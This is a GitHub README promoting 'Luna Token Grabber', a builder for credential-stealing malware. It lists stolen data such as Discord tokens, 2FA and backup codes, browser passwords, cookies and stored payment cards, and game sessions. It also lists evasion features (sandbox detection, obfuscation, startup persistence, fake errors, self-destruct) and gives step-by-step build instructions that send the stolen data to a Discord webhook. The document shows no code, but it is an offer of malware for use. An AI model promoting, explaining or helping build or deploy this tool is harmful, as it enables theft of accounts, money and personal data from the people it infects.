<h1 align="center">
  Luna Token Grabber
</h1>

<div align="center">
  <img  src="https://user-images.githubusercontent.com/99215486/175369409-b967da5b-e373-48ea-b8f5-8ed3d613df03.gif">
  <br>
  <img  src="https://img.shields.io/github/downloads/Smug246/Luna-Grabber/total?color=6d00c1">
  <img  src="https://img.shields.io/github/stars/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
  <img  src="https://img.shields.io/github/forks/Smug246/Luna-Grabber?logoColor=6d00c1">
  <br>
  <img  src="https://img.shields.io/github/commit-activity/w/Smug246/Luna-Grabber?color=6d00c1">
  <img  src="https://img.shields.io/github/last-commit/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
  <img  src="https://img.shields.io/github/license/Smug246/Luna-Grabber?color=6d00c1">
  <br>
  <img  src="https://img.shields.io/github/issues/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
  <img  src="https://img.shields.io/github/issues-closed/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
  <br>
  <p align="center">
  Telegram: https://t.me/lunaxsmug
<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
</p>
</div>

## Features

- Discord Info
    - Token
    - Nitro
    - Billing
    - 2FA 
    - Email
    - Phone
    - Gift Codes
    - Backup Codes

- Browser Data
    - Cookies
    - Passwords
    - History
    - Credit/Debit Cards

- Game Data
	- Minecraft Session Info
	- Roblox Cookie & Other Data

- Discord Injection
    - Sends token, password & email on user login or when user changes password

- System info
    - User
    - OS
    - System
    - Network IP
    - Wifi
    - Mac
    - Hwid
    - PC Specs
    - Screenshot

- General Functions
    - Checks if being run in a virustotal sandbox/virtual machine
    - Checks for blacklisted users, pc names, HWIDs, IPs, MACs and Processes
    - Adds file to startup
    - Anti Spam
    - Fake Error
    - Obfuscation
    - Icon
    - Low Detections
    - Bypass Token Protector
    - File Pumper
    - Self Destruct
    - Clipboard
 
<hr  style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;"  noshade=""  size="20"  width="100%">
  
## Installation

### 1. [Download](https://www.python.org/downloads/) Python:

```
Make sure you have Python 3.6+ installed and it is added to your path.
```
### 2. [Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip) The Files:

```
Once you've downloaded the files extract the folder so it's no longer a .zip file.
```
### 3. Open The setup.bat File:

```
You dont need to manually install any modules. Just opening setup.bat will install them for you. If successfull the setup.bat will then open up the gui.
```
### 4. Create A Webhook:

```
If you don't know how to make a webhook you can follow this guide: https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
Once created, paste the webhook into the webhook prompt.
```
### 5. Configurable Options:

```
Now once you've done that you can tick the options that you want enabled and anything you don't understand you can go 
to the documentation where each option is explained.
```
### 6. Build The File
```
To finally create the file you must enter a filename and press build. Once fully built the build button will say 'Built File'.
```
### 7. What Now?

```
The file you built will now appear in the current folder with the name you set.
```

<hr  style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;"  noshade=""  size="20"  width="100%">
  
## GUI

<div align="center">
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom: 20px;" width="70%" src="https://i.imgur.com/E8tX79g.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom: 20px;" width="70%" src="https://i.imgur.com/c1cUmZF.png"></img> 
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom: 20px;" width="70%" src="https://i.imgur.com/zReVojP.png"></img>  
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom: 20px;" width="70%" src="https://i.imgur.com/9u8nNbD.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom: 20px;" width="70%" src="https://i.imgur.com/6GO5CB4.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom: 20px;" width="70%" src="https://i.imgur.com/4DNCiAJ.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom: 20px;" width="70%" src="https://i.imgur.com/s5f4HVs.png"></img>
</div>

## Contributing
Contributions are a great way to keep the project active and up to date. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this project better, you can simply open a [feature request](https://github.com/Smug246/Luna-Grabber/issues/new?assignees=Smug246&labels=enhancement&projects=&template=feature_request.yml&title=feature%3A).
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/NewFeature`)
3. Commit your Changes (`git commit -m 'Add New Feature'`)
4. Push to the Branch (`git push origin feature/NewFeature`)
5. Open a Pull Request

## Errors
If you find an error that you cant fix and need help with you can submit an [issue](https://github.com/Smug246/Luna-Grabber/issues/) or join the [telegram](https://t.me/lunaxsmug) for support


## License
Luna Grabber is distributed under the MIT License. See `LICENSE.md` for more information.


## Star Graph

![Star History Chart](https://api.star-history.com/svg?repos=Smug246/Luna-Grabber&type=Date)
